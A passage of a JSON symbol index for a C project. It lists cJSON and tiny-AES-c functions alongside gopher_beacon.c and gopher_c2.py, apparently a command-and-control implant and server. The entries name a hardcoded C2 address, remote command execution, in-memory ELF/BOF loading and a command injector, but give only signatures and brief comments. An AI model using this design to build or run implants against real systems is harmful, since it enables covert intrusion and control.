cJSON_CreateStringArray(const char *const *strings, int count)"}, {"kind": "function", "line": 2785, "name": "cJSON_Duplicate_rec", "signature": "cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)"}, {"kind": "function", "line": 2872, "name": "skip_oneline_comment", "signature": "static void skip_oneline_comment(char **input)"}, {"kind": "function", "line": 2885, "name": "skip_multiline_comment", "signature": "static void skip_multiline_comment(char **input)"}, {"kind": "function", "line": 2899, "name": "minify_string", "signature": "static void minify_string(char **input, char **output)"}, {"kind": "function", "line": 2921, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_Minify(char *json)"}, {"kind": "function", "line": 2971, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)"}, {"kind": "function", "line": 2981, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)"}, {"kind": "function", "line": 2991, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)"}, {"kind": "function", "line": 3001, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)"}, {"kind": "function", "line": 3011, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)"}, {"kind": "function", "line": 3021, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)"}, {"kind": "function", "line": 3031, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)"}, {"kind": "function", "line": 3041, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)"}, {"kind": "function", "line": 3051, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)"}, {"kind": "function", "line": 3061, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)"}, {"kind": "function", "line": 3071, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_..."}, {"kind": "function", "line": 3157, "name": "cJSON_ArrayForEach", "signature": "cJSON_ArrayForEach(a_element, a)"}, {"doc": "doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is just a fix for now", "kind": "function", "line": 3173, "name": "cJSON_ArrayForEach", "signature": "cJSON_ArrayForEach(b_element, b)"}, {"kind": "function", "line": 3193, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void *) cJSON_malloc(size_t size)"}, {"kind": "function", "line": 3198, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_free(void *object)"}, {"kind": "function", "line": 128, "name": "sprintf", "signature": "sprintf(version, \"%i.%i.%i\", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);"}, {"kind": "function", "line": 153, "name": "tolower", "signature": "return tolower(*string1) - tolower(*string2);"}, {"kind": "function", "line": 160, "name": "void", "signature": "void (CJSON_CDECL *deallocate)(void *pointer);"}, {"kind": "function", "line": 168, "name": "malloc", "signature": "return malloc(size);"}, {"kind": "function", "line": 172, "name": "free", "signature": "free(pointer);"}, {"kind": "function", "line": 176, "name": "realloc", "signature": "return realloc(pointer, size);"}, {"kind": "function", "line": 205, "name": "memcpy", "signature": "memcpy(copy, string, length);"}, {"kind": "function", "line": 247, "name": "memset", "signature": "memset(node, '\\0', sizeof(cJSON));"}, {"kind": "function", "line": 262, "name": "cJSON_Delete", "signature": "cJSON_Delete(item->child);"}, {"kind": "function", "line": 464, "name": "strcpy", "signature": "strcpy(object->valuestring, valuestring);"}, {"kind": "function", "line": 475, "name": "cJSON_free", "signature": "cJSON_free(object->valuestring);"}, {"kind": "function", "line": 1145, "name": "cJSON_ParseWithLengthOpts", "signature": "return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);"}, {"kind": "function", "line": 1233, "name": "cJSON_ParseWithOpts", "signature": "return cJSON_ParseWithOpts(value, 0, 0);"}, {"kind": "function", "line": 2293, "name": "cJSON_DetachItemViaPointer", "signature": "return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));"}, {"kind": "function", "line": 2419, "name": "cJSON_ReplaceItemViaPointer", "signature": "return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);"}, {"kind": "macro", "line": 28, "name": "_CRT_SECURE_NO_DEPRECATE", "signature": "#define _CRT_SECURE_NO_DEPRECATE"}, {"kind": "macro", "line": 65, "name": "true", "signature": "#define true"}, {"kind": "macro", "line": 70, "name": "false", "signature": "#define false"}, {"kind": "macro", "line": 74, "name": "isinf", "signature": "#define isinf(d)"}, {"kind": "macro", "line": 77, "name": "isnan", "signature": "#define isnan(d)"}, {"kind": "macro", "line": 82, "name": "NAN", "signature": "#define NAN"}, {"kind": "macro", "line": 84, "name": "NAN", "signature": "#define NAN"}, {"kind": "macro", "line": 179, "name": "internal_malloc", "signature": "#define internal_malloc"}, {"kind": "macro", "line": 180, "name": "internal_free", "signature": "#define internal_free"}, {"kind": "macro", "line": 181, "name": "internal_realloc", "signature": "#define internal_realloc"}, {"kind": "macro", "line": 185, "name": "static_strlen", "signature": "#define static_strlen(string_literal)"}, {"kind": "macro", "line": 301, "name": "can_read", "signature": "#define can_read(buffer, size)"}, {"kind": "macro", "line": 303, "name": "can_access_at_index", "signature": "#define can_access_at_index(buffer, index)"}, {"kind": "macro", "line": 304, "name": "cannot_access_at_index", "signature": "#define cannot_access_at_index(buffer, index)"}, {"kind": "macro", "line": 306, "name": "buffer_at_offset", "signature": "#define buffer_at_offset(buffer)"}, {"kind": "macro", "line": 1240, "name": "cjson_min", "signature": "#define cjson_min(a, b)"}]}, {"id": "cJSON.h", "kind": "module", "label": "cJSON.h", "language": "h", "sha256": "d0b68802b92f169e", "symbol_count": 38, "symbols": [{"doc": "#define cJSON_Invalid (0) #define cJSON_False  (1 << 0) #define cJSON_True   (1 << 1) #define cJSON_NULL   (1 << 2) #define cJSON_Number (1 << 3) #define cJSON_String (1 << 4) #define cJSON_Array  (1 << 5) #define cJSON_Object (1 << 6) #define cJSON_Raw    (1 << 7) /* raw json #define cJSON_IsReference 256 #define cJSON_StringIsConst 512 /* The cJSON structure:", "kind": "struct", "line": 92, "name": "cJSON"}, {"kind": "struct", "line": 114, "name": "cJSON_Hooks"}, {"kind": "type_alias", "line": 120, "name": "cJSON_bool", "signature": "typedef int cJSON_bool;"}, {"kind": "function", "line": 118, "name": "void", "signature": "void (CJSON_CDECL *free_fn)(void *ptr);"}, {"kind": "function", "line": 249, "name": "sensitive", "signature": "* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo"}, {"doc": "ifdef __cplusplus", "kind": "variable", "line": 27, "name": "next", "signature": "extern \"C\" { #endif #if !defined(__WINDOWS__) && (defined(WIN32) || defined(WIN64) || defined(_MSC_VER) || defined(_WIN32)) #define __WINDOWS__ #endif #ifdef __WINDOWS__ /* When compiling for windows,"}, {"kind": "macro", "line": 24, "name": "cJSON__h", "signature": "#define cJSON__h"}, {"kind": "macro", "line": 32, "name": "__WINDOWS__", "signature": "#define __WINDOWS__"}, {"kind": "macro", "line": 43, "name": "CJSON_CDECL", "signature": "#define CJSON_CDECL"}, {"kind": "macro", "line": 45, "name": "CJSON_STDCALL", "signature": "#define CJSON_STDCALL"}, {"kind": "macro", "line": 49, "name": "CJSON_EXPORT_SYMBOLS", "signature": "#define CJSON_EXPORT_SYMBOLS"}, {"kind": "macro", "line": 53, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 55, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 57, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 60, "name": "CJSON_CDECL", "signature": "#define CJSON_CDECL"}, {"kind": "macro", "line": 61, "name": "CJSON_STDCALL", "signature": "#define CJSON_STDCALL"}, {"kind": "macro", "line": 64, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 66, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 71, "name": "CJSON_VERSION_MAJOR", "signature": "#define CJSON_VERSION_MAJOR"}, {"kind": "macro", "line": 72, "name": "CJSON_VERSION_MINOR", "signature": "#define CJSON_VERSION_MINOR"}, {"kind": "macro", "line": 73, "name": "CJSON_VERSION_PATCH", "signature": "#define CJSON_VERSION_PATCH"}, {"kind": "macro", "line": 78, "name": "cJSON_Invalid", "signature": "#define cJSON_Invalid"}, {"kind": "macro", "line": 79, "name": "cJSON_False", "signature": "#define cJSON_False"}, {"kind": "macro", "line": 80, "name": "cJSON_True", "signature": "#define cJSON_True"}, {"kind": "macro", "line": 81, "name": "cJSON_NULL", "signature": "#define cJSON_NULL"}, {"kind": "macro", "line": 82, "name": "cJSON_Number", "signature": "#define cJSON_Number"}, {"kind": "macro", "line": 83, "name": "cJSON_String", "signature": "#define cJSON_String"}, {"kind": "macro", "line": 84, "name": "cJSON_Array", "signature": "#define cJSON_Array"}, {"kind": "macro", "line": 85, "name": "cJSON_Object", "signature": "#define cJSON_Object"}, {"kind": "macro", "line": 86, "name": "cJSON_Raw", "signature": "#define cJSON_Raw"}, {"kind": "macro", "line": 87, "name": "cJSON_IsReference", "signature": "#define cJSON_IsReference"}, {"kind": "macro", "line": 89, "name": "cJSON_StringIsConst", "signature": "#define cJSON_StringIsConst"}, {"kind": "macro", "line": 126, "name": "CJSON_NESTING_LIMIT", "signature": "#define CJSON_NESTING_LIMIT"}, {"kind": "macro", "line": 132, "name": "CJSON_CIRCULAR_LIMIT", "signature": "#define CJSON_CIRCULAR_LIMIT"}, {"kind": "macro", "line": 270, "name": "cJSON_SetIntValue", "signature": "#define cJSON_SetIntValue(object, number)"}, {"kind": "macro", "line": 273, "name": "cJSON_SetNumberValue", "signature": "#define cJSON_SetNumberValue(object, number)"}, {"kind": "macro", "line": 278, "name": "cJSON_SetBoolValue", "signature": "#define cJSON_SetBoolValue(object, boolValue)"}, {"kind": "macro", "line": 285, "name": "cJSON_ArrayForEach", "signature": "#define cJSON_ArrayForEach(element, array)"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <openssl/rand.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include \"beacon.h\" include \"aes.h\" include \"cJSON.h\"  define C2              \"10.10.14.57\"", "id": "gopher_beacon.c", "kind": "module", "label": "gopher_beacon.c", "language": "c", "sha256": "dddf422aa5bb38fa", "symbol_count": 65, "symbols": [{"doc": "=== ESTRUCTURAS ===", "kind": "struct", "line": 47, "name": "MemoryStruct"}, {"doc": "=== TRAMPOLINES ===", "kind": "struct", "line": 54, "name": "Trampoline"}, {"kind": "struct", "line": 62, "name": "SymbolResolver"}, {"doc": "=== CACHE DE TRAMPOLINES ===", "kind": "struct", "line": 68, "name": "TrampolineCache"}, {"kind": "function", "line": 137, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"doc": "=== BEACON API ===", "kind": "function", "line": 190, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 202, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "=== CRATE TRAPOLINE ===", "kind": "function", "line": 214, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"doc": "=== CLEAN TRAMPOLINE ===", "kind": "function", "line": 250, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 265, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"doc": "=== CURL WRITE CALLBACK ===", "kind": "function", "line": 297, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"doc": "=== GOPHER REQUEST () ===", "kind": "function", "line": 314, "name": "gopher_request", "signature": "char* gopher_request(const char* host, int port, const char* selector, const char* method, const ..."}, {"doc": "=== BASE64 ===", "kind": "function", "line": 377, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 393, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"doc": "=== AES CFB ===", "kind": "function", "line": 417, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 444, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "=== EXEC CMD ===", "kind": "function", "line": 475, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"doc": "=== Función auxiliar: alinear al tamaño de página ===", "kind": "function", "line": 506, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 511, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, \n           unsi..."}, {"doc": "=== GET LOCAL IPs ===", "kind": "function", "line": 893, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"doc": "=== DOWNLOAD BOF ===", "kind": "function", "line": 922, "name": "download_bof", "signature": "unsigned char* download_bof(const char* bof_selector, size_t* out_size)"}, {"doc": "=== RUN BOF AND CAPTURE ===", "kind": "function", "line": 950, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "=== MAIN ===", "kind": "function", "line": 994, "name": "main", "signature": "int main()"}, {"doc": "=== TIPOS Y SÍMBOLOS FALTANTES ===", "kind": "function", "line": 60, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call", "kind": "function", "line": 143, "name": "volatile", "signature": "asm volatile( // Guardar frame pointer \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" // Guardar callee-saved registers \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" //"}, {"kind": "function", "line": 193, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 197, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 208, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 221, "name": "fprintf", "signature": "fprintf(stderr, \"[!] Trampolín: mmap falló\\n\");"}, {"kind": "function", "line": 237, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 254, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 319, "name": "fflush", "signature": "fflush(stdout);"}, {"kind": "function", "line": 326, "name": "snprintf", "signature": "snprintf(full_selector, sizeof(full_selector), \"/report/%s\", post_data);"}, {"kind": "function", "line": 345, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 350, "name": "send", "signature": "send(sockfd, req, strlen(req), 0);"}, {"kind": "function", "line": 383, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 384, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 385, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 386, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 390, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 420, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 428, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 437, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 478, "name": "strdup", "signature": "return strdup(\"[!] Empty command\");"}, {"kind": "function", "line": 488, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 682, "name": "perror", "signature": "perror(\"calloc\");"}, {"kind": "function", "line": 878, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 912, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 914, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 918, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"doc": "memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\\0'; out_len = g_output_len; fprintf(stderr, \"[DEBUG] run_bof_and_capture: EXIT with %d bytes\\n\", *out_len); fflush(stderr); return output; } === MAIN === int main() { /* Fuerza line-buffering en stdout/stderr para que se imprima todo en tiempo real", "kind": "function", "line": 996, "name": "setvbuf", "signature": "setvbuf(stdout, NULL, _IOLBF, 0);"}, {"kind": "function", "line": 998, "name": "printf", "signature": "printf(\"[*] Beacon starting...\\n\");"}, {"kind": "function", "line": 1001, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 1028, "name": "sleep", "signature": "sleep(6);"}, {"kind": "function", "line": 1122, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 1130, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1133, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1138, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1142, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 1148, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 29, "name": "C2", "signature": "#define C2"}, {"kind": "macro", "line": 31, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 32, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 33, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}]}, {"id": "gopher_c2.py", "kind": "module", "label": "gopher_c2.py", "language": "py", "sha256": "c17087cbf1900a74", "symbol_count": 5, "symbols": [{"kind": "function", "line": 28, "name": "encrypt_data", "signature": "def encrypt_data(data)"}, {"kind": "function", "line": 37, "name": "decrypt_data", "signature": "def decrypt_data(b64_data)"}, {"kind": "function", "line": 45, "name": "handle_client", "signature": "def handle_client(conn, addr)"}, {"kind": "function", "line": 127, "name": "main", "signature": "def main()"}, {"kind": "function", "line": 136, "name": "command_injector", "signature": "def command_injector()"}]}, {"doc": "aes.c - tiny-AES-c (https://github.com/kokke/tiny-AES-c) include \"aes.h\" include <string.h>  define Nb 4    define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16", "id": "include/aes.c", "kind": "module", "label": "aes.c", "language": "c", "sha256": "5d58475946dc3170", "symbol_count": 44, "symbols": [{"doc": "define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16", "kind": "function", "line": 12, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t getSBoxValue(uint8_t num)"}, {"kind": "function", "line": 34, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t getSBoxInvert(uint8_t num)"}, {"kind": "function", "line": 56, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t Td0(int x)"}, {"kind": "function", "line": 58, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t Td1(int x)"}, {"kind": "function", "line": 59, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t Td2(int x)"}, {"kind": "function", "line": 60, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t Td3(int x)"}, {"kind": "function", "line": 61, "name": "__attribute__", "signature": "static __attribute__((unused)) uint8_t Td4(int x)"}, {"doc": "This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.", "kind": "function", "line": 166, "name": "KeyExpansion", "signature": "static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)"}, {"kind": "function", "line": 238, "name": "AES_init_ctx", "signature": "void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)"}, {"doc": "if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))", "kind": "function", "line": 244, "name": "AES_init_ctx_iv", "signature": "void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)"}, {"kind": "function", "line": 249, "name": "AES_ctx_set_iv", "signature": "void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)"}, {"doc": "This function adds the round key to state. The round key is added to the state by an XOR function.", "kind": "function", "line": 257, "name": "AddRoundKey", "signature": "static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)"}, {"doc": "The SubBytes Function Substitutes the values in the state matrix with values in an S-box.", "kind": "function", "line": 271, "name": "SubBytes", "signature": "static void SubBytes(state_t* state)"}, {"doc": "The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = Row number. So the first row is not shifted.", "kind": "function", "line": 286, "name": "ShiftRows", "signature": "static void ShiftRows(state_t* state)"}, {"kind": "function", "line": 313, "name": "xtime", "signature": "static uint8_t xtime(uint8_t x)"}, {"doc": "MixColumns function mixes the columns of the state matrix", "kind": "function", "line": 320, "name": "MixColumns", "signature": "static void MixColumns(state_t* state)"}, {"doc": "Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary The compiler seems to be able to vectorize the operation better this way. See https://github.com/kokke/tiny-AES-c/pull/34 if MULTIPLY_AS_A_FUNCTION", "kind": "function", "line": 340, "name": "Multiply", "signature": "static uint8_t Multiply(uint8_t x, uint8_t y)"}, {"doc": "MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand for the inexperienced. Please use the references to gain more information.", "kind": "function", "line": 370, "name": "InvMixColumns", "signature": "static void InvMixColumns(state_t* state)"}, {"doc": "The SubBytes Function Substitutes the values in the state matrix with values in an S-box.", "kind": "function", "line": 391, "name": "InvSubBytes", "signature": "static void InvSubBytes(state_t* state)"}, {"kind": "function", "line": 402, "name": "InvShiftRows", "signature": "static void InvShiftRows(state_t* state)"}, {"doc": "Cipher is the main function that encrypts the PlainText.", "kind": "function", "line": 433, "name": "Cipher", "signature": "static void Cipher(state_t* state, const uint8_t* RoundKey)"}, {"doc": "if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)", "kind": "function", "line": 459, "name": "InvCipher", "signature": "static void InvCipher(state_t* state, const uint8_t* RoundKey)"}, {"doc": "AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)  /* Public functions:  if defined(ECB) && (ECB == 1)", "kind": "function", "line": 488, "name": "AES_ECB_encrypt", "signature": "void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)"}, {"kind": "function", "line": 495, "name": "AES_ECB_decrypt", "signature": "void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)"}, {"doc": "if defined(CBC) && (CBC == 1)", "kind": "function", "line": 510, "name": "XorWithIv", "signature": "static void XorWithIv(uint8_t* buf, const uint8_t* Iv)"}, {"kind": "function", "line": 520, "name": "AES_CBC_encrypt_buffer", "signature": "void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)"}, {"kind": "function", "line": 535, "name": "AES_CBC_decrypt_buffer", "signature": "void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)"}, {"doc": "XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key", "kind": "function", "line": 558, "name": "AES_CTR_xcrypt_buffer", "signature": "void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)"}, {"kind": "function", "line": 247, "name": "memcpy", "signature": "memcpy (ctx->Iv, iv, AES_BLOCKLEN);"}, {"kind": "macro", "line": 4, "name": "Nb", "signature": "#define Nb"}, {"kind": "macro", "line": 6, "name": "KEYLEN_256", "signature": "#define KEYLEN_256"}, {"kind": "macro", "line": 10, "name": "RKLENGTH", "signature": "#define RKLENGTH"}, {"kind": "macro", "line": 11, "name": "BLOCKLEN", "signature": "#define BLOCKLEN"}, {"kind": "macro", "line": 67, "name": "Nb", "signature": "#define Nb"}, {"kind": "macro", "line": 70, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 71, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 73, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 74, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 76, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 77, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 84, "name": "MULTIPLY_AS_A_FUNCTION", "signature": "#define MULTIPLY_AS_A_FUNCTION"}, {"kind": "macro", "line": 163, "name": "getSBoxValue", "signature": "#define getSBoxValue(num)"}, {"kind": "macro", "line": 349, "name": "Multiply", "signature": "#define Multiply(x, y)"}, {"kind": "macro", "line": 365, "name": "getSBoxInvert", "signature": "#define getSBoxInvert(num)"}]}, {"doc": "ifndef _AES_H_ define _AES_H_  include <stdint.h> include <stddef.h>  #define the macros below to 1/0 to enable/disable the mode of operation. ifndef CBC define CBC 1 endif ifndef ECB define ECB 1 endif ifndef CTR define CTR 1 endif  define AES256 1  // ✅ Clave de 256 bits  define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only  if defined(AES256) && (AES256 == 1) define AES_KEYLEN 32 define AES_keyExpSize 240 elif defined(AES192) && (AES192 == 1) define AES_KEYLEN 24 define AES_keyExpSize 208 else define AES_KEYLEN 16   // Key length in bytes define AES_keyExpSize 176", "id": "include/aes.h", "kind": "module", "label": "aes.h", "language": "h", "sha256": "ee79dba207a2703f", "symbol_count": 21, "symbols": [{"kind": "struct", "line": 33, "name": "AES_ctx"}, {"kind": "function", "line": 40, "name": "AES_init_ctx", "signature": "void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);"}, {"doc": "if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))", "kind": "function", "line": 43, "name": "AES_init_ctx_iv", "signature": "void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);"}, {"kind": "function", "line": 44, "name": "AES_ctx_set_iv", "signature": "void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);"}, {"doc": "if defined(ECB) && (ECB == 1)", "kind": "function", "line": 48, "name": "AES_ECB_encrypt", "signature": "void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);"}, {"kind": "function", "line": 49, "name": "AES_ECB_decrypt", "signature": "void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);"}, {"doc": "if defined(CBC) && (CBC == 1)", "kind": "function", "line": 53, "name": "AES_CBC_encrypt_buffer", "signature": "void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"kind": "function", "line": 54, "name": "AES_CBC_decrypt_buffer", "signature": "void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"doc": "if defined(CTR) && (CTR == 1)", "kind": "function", "line": 58, "name": "AES_CTR_xcrypt_buffer", "signature": "void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"kind": "macro", "line": 2, "name": "_AES_H_", "signature": "#define _AES_H_"}, {"kind": "macro", "line": 9, "name": "CBC", "signature": "#define CBC"}, {"kind": "macro", "line": 12, "name": "ECB", "signature": "#define ECB"}, {"kind": "macro", "line": 15, "name": "CTR", "signature": "#define CTR"}, {"kind": "macro", "line": 17, "name": "AES256", "signature": "#define AES256"}, {"kind": "macro", "line": 19, "name": "AES_BLOCKLEN", "signature": "#define AES_BLOCKLEN"}, {"kind": "macro", "line": 23, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": 